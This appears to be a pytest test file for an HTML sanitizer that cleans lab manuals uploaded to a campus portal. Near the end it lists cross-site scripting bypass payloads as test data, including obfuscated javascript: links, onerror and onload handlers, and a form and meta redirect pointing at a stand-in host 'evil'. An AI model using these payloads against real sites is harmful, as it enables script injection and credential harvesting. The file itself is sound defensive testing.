import pytest

from services.campus.lab_manual_html import sanitize_lab_manual_html


def test_structure_and_text_survive() -> None:
    result = sanitize_lab_manual_html(
        "<h2>装环境</h2><p>先安装 <code>torch</code>：</p>"
        "<pre><code>pip install torch</code></pre>"
        "<ul><li>CUDA 12.4</li></ul>"
        "<table><thead><tr><th>包</th></tr></thead><tbody><tr><td>torch</td></tr></tbody></table>"
    )

    assert "<h2>装环境</h2>" in result.html
    assert "<code>pip install torch</code>" in result.html
    assert "<li>CUDA 12.4</li>" in result.html
    assert "<th>包</th>" in result.html
    assert result.removed == {}


def test_scripts_are_removed_with_their_content() -> None:
    # Leaving the body behind would dump JavaScript source into the page as
    # visible text, which is what makes an upload look broken.
    result = sanitize_lab_manual_html("<p>before</p><script>alert(1)</script><p>after</p>")

    assert "alert" not in result.html
    assert result.html == "<p>before</p><p>after</p>"
    assert result.removed["script"] == 1


def test_styles_are_removed_with_their_content() -> None:
    # The portal's content security policy admits no inline styles, so keeping
    # them would render nothing and report nothing.
    result = sanitize_lab_manual_html('<style>p{color:red}</style><p style="color:red">x</p>')

    assert "color:red" not in result.html
    assert result.html == "<p>x</p>"
    assert result.removed["style"] == 1
    assert result.removed["style attribute"] == 1


def test_event_handlers_are_removed() -> None:
    result = sanitize_lab_manual_html('<p onclick="steal()" onmouseover="x()">x</p>')

    assert "onclick" not in result.html
    assert "steal" not in result.html
    assert result.removed["event handler"] == 2


@pytest.mark.parametrize("tag", ["iframe", "object", "form", "noscript", "template"])
def test_container_tags_are_removed_with_their_content(tag: str) -> None:
    result = sanitize_lab_manual_html(f"<p>a</p><{tag}><p>swallowed</p></{tag}><p>b</p>")

    assert "swallowed" not in result.html
    assert result.html == "<p>a</p><p>b</p>"
    assert result.removed[tag] == 1


@pytest.mark.parametrize("tag", ["embed", "input", "link", "base"])
def test_void_tags_are_removed(tag: str) -> None:
    # These carry no content by definition, so only the element itself goes.
    result = sanitize_lab_manual_html(f"<p>a</p><{tag}><p>b</p>")

    assert f"<{tag}" not in result.html
    assert result.html == "<p>a</p><p>b</p>"


def test_links_keep_safe_protocols_and_lose_the_rest() -> None:
    result = sanitize_lab_manual_html(
        '<a href="https://pytorch.org">docs</a>'
        '<a href="/portal/labs/1">chapter</a>'
        '<a href="javascript:steal()">bad</a>'
        '<a href="data:text/html;base64,PHNjcmlwdD4=">bad</a>'
    )

    assert 'href="https://pytorch.org"' in result.html
    assert 'href="/portal/labs/1"' in result.html
    assert "javascript" not in result.html
    assert "base64" not in result.html
    assert result.removed["unsafe link"] == 2


def test_images_keep_same_origin_sources_and_lose_remote_ones() -> None:
    # img-src is 'self', so a remote image is blocked by the browser with no
    # error. Rejecting it here at least tells the administrator.
    result = sanitize_lab_manual_html(
        '<img src="/console/api/campus/lab-manuals/images/abc" alt="架构图">'
        '<img src="https://example.com/x.png" alt="remote">'
    )

    assert 'src="/console/api/campus/lab-manuals/images/abc"' in result.html
    assert 'alt="架构图"' in result.html
    assert "example.com" not in result.html
    assert result.removed["remote image"] == 1


def test_comments_are_removed() -> None:
    result = sanitize_lab_manual_html("<p>a</p><!-- internal note --><p>b</p>")

    assert "internal note" not in result.html
    assert result.html == "<p>a</p><p>b</p>"


def test_an_upload_with_nothing_renderable_is_rejected() -> None:
    from services.campus.errors import CampusValidationError

    with pytest.raises(CampusValidationError, match="no readable content"):
        sanitize_lab_manual_html("<style>p{color:red}</style>")
    with pytest.raises(CampusValidationError, match="no readable content"):
        sanitize_lab_manual_html("   ")


def test_a_word_processor_export_survives_as_readable_structure() -> None:
    # What an administrator actually uploads: a document saved as HTML, carrying
    # a stylesheet, class soup, and inline styles on every element.
    result = sanitize_lab_manual_html(
        "<html><head><meta charset='utf-8'><title>t</title>"
        "<style>.c0{font-family:Calibri}</style></head><body>"
        "<p class='c0' style='margin:0pt'>第一步：安装 conda</p>"
        "<p class='c1' style='margin:0pt'><span style='font-weight:700'>注意</span>显存要求</p>"
        "</body></html>"
    )

    assert "Calibri" not in result.html
    assert "margin" not in result.html
    assert "第一步：安装 conda" in result.html
    assert "<span>注意</span>" in result.html
    assert result.removed["style"] == 1
    assert result.removed["style attribute"] == 3


# Attempts an upload could plausibly carry, whether pasted from the web on
# purpose or inherited from a template. None of them may survive.
BYPASS_ATTEMPTS = [
    ("mixed case tag", "<p>a</p><ScRiPt>alert(1)</ScRiPt>"),
    ("nested script", "<p>a</p><script><script>alert(1)</script></script>"),
    ("unclosed script", "<p>a</p><script>alert(1)"),
    ("angle brackets inside an attribute", '<p title="><script>alert(1)</script>">a</p>'),
    ("svg with an event handler", '<p>a</p><svg onload="alert(1)"></svg>'),
    ("img with an error handler", '<p>a</p><img src="/x" onerror="alert(1)">'),
    ("mixed case protocol", '<a href="JaVaScRiPt:alert(1)">l</a><p>a</p>'),
    ("protocol split by a tab", '<a href="java\tscript:alert(1)">l</a><p>a</p>'),
    ("entity-encoded protocol", '<a href="&#106;avascript:alert(1)">l</a><p>a</p>'),
    ("meta refresh redirect", '<p>a</p><meta http-equiv="refresh" content="0;url=http://evil">'),
    ("stylesheet import", "<p>a</p><style>@import url(http://evil)</style>"),
    ("script hidden in a comment", "<p>a</p><!--<script>alert(1)</script>-->"),
    ("credential-harvesting form", '<p>a</p><form action="http://evil"><input name="pw"></form>'),
    ("base tag rewriting relative paths", '<p>a</p><base href="http://evil/">'),
]


@pytest.mark.parametrize(("label", "raw"), BYPASS_ATTEMPTS, ids=[label for label, _ in BYPASS_ATTEMPTS])
def test_injection_attempts_do_not_survive(label: str, raw: str) -> None:
    html = sanitize_lab_manual_html(raw).html.lower()

    for forbidden in ("script", "onerror", "onload", "javascript", "evil", "@import", "http-equiv"):
        assert forbidden not in html, f"{label} leaked {forbidden}: {html}"
